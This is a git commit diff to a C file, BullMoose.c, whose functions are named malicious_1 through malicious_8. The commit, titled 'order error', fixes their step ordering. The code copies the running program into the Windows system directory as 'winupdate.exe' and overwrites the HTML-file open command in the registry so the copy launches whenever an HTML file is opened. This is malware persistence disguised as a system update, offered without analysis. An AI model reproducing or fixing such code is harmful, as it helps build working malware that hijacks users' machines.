1d9d4b4ea8bf9dd884e655de44d0dfbf3c152150
HY <haoyu.zz@foxmail.com>
2017-01-12 15:02:25 +0800

    order 错误

--- bullmoose/BullMoose.c
+++ bullmoose/BullMoose.c
@@ -18,49 +18,49 @@ void malicious_1(){
 }
 
 void malicious_2(){
-	if((1 - order) == 1){
+	if((2 - order) == 1){
 		order = 2;	
 		GetSystemDirectory(CpyPath,sizeof(CpyPath));
 	}
 }
 
 void malicious_3(){
-	if((1 - order) == 1){
+	if((3 - order) == 1){
 		order = 3;
 		strcat(CpyPath,"\\winupdate.exe");
 	}
 }
 
 void malicious_4(){
-	if((1 - order) == 1){
+	if((4 - order) == 1){
 		order = 4;
 		CopyFile(MyPath,CpyPath,FALSE);
 	}
 }
 
 void malicious_5(){
-	if((1 - order) == 1){
+	if((5 - order) == 1){
 		order = 5;
 		strcat(CpyPath," %1");
 	}
 }
 
 void malicious_6(){
-	if((1 - order) == 1){
+	if((6 - order) == 1){
 		order = 6;
 		RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
 	}
 }
 
 void malicious_7(){
-	if((1 - order) == 1){
+	if((7 - order) == 1){
 		order = 7;
 		RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
 	}
 }
 
 void malicious_8(){
-	if((1 - order) == 1){
+	if((8 - order) == 1){
 		order = 8;
 		RegCloseKey(Key32);
 	}
